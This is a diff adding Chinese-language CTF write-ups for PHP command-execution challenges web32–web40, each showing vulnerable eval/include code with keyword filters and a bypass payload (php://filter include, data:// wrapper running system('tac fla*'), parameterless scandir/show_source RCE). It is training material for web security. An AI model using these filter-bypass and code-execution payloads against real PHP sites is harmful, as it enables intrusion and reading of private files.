@@ -1304,7 +1304,59 @@ nginx默认日志位置：/var/log/nginx/access.log<br>
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c = $_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(/i&quot;</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>这次把反引号和echo都过滤了，不过还有新姿势，利用include函数(还有require也可以)</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?c&#x3D;include$_POST[a]?&gt;</span><br><span class="line"></span><br><span class="line">post:a&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</span><br></pre></td></tr></table></figure>
-<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web32/Z2ILTYJZF_YO%40_2%28%7BP0GY%5B2.png" alt=""></p>
+<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web32/Z2ILTYJZF_YO%40_2%28%7BP0GY%5B2.png" alt=""><br>
+把base64解码后即可得到flag</p>
+<h3 id="web33"><a class="header-anchor" href="#web33">¶</a>web33</h3>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c = $_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\&quot;/i&quot;</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这次多过滤了双引号，继续使用上一题的payload</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?c&#x3D;include$_GET[a]?&gt;&amp;a&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</span><br></pre></td></tr></table></figure>
+<h3 id="web34"><a class="header-anchor" href="#web34">¶</a>web34</h3>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c = $_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;/i&quot;</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>多过滤一个:号，还是可以使用上一题的payload</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?c&#x3D;include$_GET[a]?&gt;&amp;a&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</span><br></pre></td></tr></table></figure>
+<h3 id="web35"><a class="header-anchor" href="#web35">¶</a>web35</h3>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c = $_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;|\&lt;|\=/i&quot;</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>多过滤一个&lt;号和一个=号，不过没有影响，继续使用前面的payload</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?c&#x3D;include$_GET[a]?&gt;&amp;a&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</span><br></pre></td></tr></table></figure>
+<h3 id="web36"><a class="header-anchor" href="#web36">¶</a>web36</h3>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c = $_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;|\&lt;|\=|\/|[0-9]/i&quot;</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这次增加过滤数字，但还是没有影响，继续使用前面payload</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?c&#x3D;include$_GET[a]?&gt;&amp;a&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</span><br></pre></td></tr></table></figure>
+<h3 id="web37"><a class="header-anchor" href="#web37">¶</a>web37</h3>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c = $_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag/i&quot;</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">include</span>($c);</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>换新题了，这次是使用了include语句，这里过滤了flag，我们采用伪协议data的方法进行绕过</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?c&#x3D;data:text&#x2F;plain,&lt;?&#x3D;system(&quot;tac fla*&quot;);?&gt;</span><br></pre></td></tr></table></figure>
+<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web37/%5DJ0%28I6%7BNZRUAD3WLGORLO%604.png" alt=""></p>
+<h3 id="web38"><a class="header-anchor" href="#web38">¶</a>web38</h3>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c = $_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|php|file/i&quot;</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">include</span>($c);</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这次在前面基础上过滤了php和file，对我们无碍，因为我们使用的是php短标签，所以继续使用上面的payload</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?c&#x3D;data:text&#x2F;plain,&lt;?&#x3D;system(&quot;tac fla*&quot;);?&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="web39"><a class="header-anchor" href="#web39">¶</a>web39</h3>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c = $_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag/i&quot;</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">include</span>($c.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这次减少了过滤，但是会再后面加上.php的后缀，然而我们前面的payload结尾是有一个?&gt;进行了标签闭合，所以?&gt;.php没有影响，继续使用前面payload</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?c&#x3D;data:text&#x2F;plain,&lt;?&#x3D;system(&quot;tac fla*&quot;);?&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="web40"><a class="header-anchor" href="#web40">¶</a>web40</h3>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c = $_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\&#x27;|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\/i&quot;</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这里回到eval语句执行命令，但过滤了许多东西，没有过滤掉英文的()，那我们使用无参数的rce进行构造读取文件</p>
+<blockquote>
+<p>print_r(scandir(‘.’));      查看当前目录下的所有文件名</p>
+<p>localeconv() 				函数返回一包含本地数字及货币格式信息的数组。</p>
+<p>current() 					  函数返回数组中的当前元素（单元）,默认取第一个值，pos是current的别名</p>
+</blockquote>
+<p>我们先打印出当前目录下的文件</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?c&#x3D;print_r(scandir(current(localeconv())));</span><br></pre></td></tr></table></figure>
+<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web40/NHDM7A4%5BNQ%5BU3%25S%401W%60%24R2P.png" alt=""><br>
+读取目录文件后，发现输出的是数组，而文件名是数组中的值，下一步我们需要取出想要读取文件的数组</p>
+<blockquote>
+<p>each()        返回数组中当前的键/值对并将数组指针向前移动一步<br>
+end()          将数组的内部指针指向最后一个单元<br>
+next()         将数组中的内部指针向前移动一位<br>
+prev()         将数组中的内部指针倒回一位<br>
+array_reverse() 	以相反的元素顺序返回数组</p>
+</blockquote>
+<p>需要知识点齐了，观察flag.php在倒数第二位，我们开始构造</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?c&#x3D;show_source(next(array_reverse(scandir(getcwd()))));</span><br></pre></td></tr></table></figure>
+<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web40/AKO6S7Q%24R_EJ%5B6Q13BEICQ9.png" alt=""></p>
 ]]></content>
       <tags>
         <tag>CTF</tag>
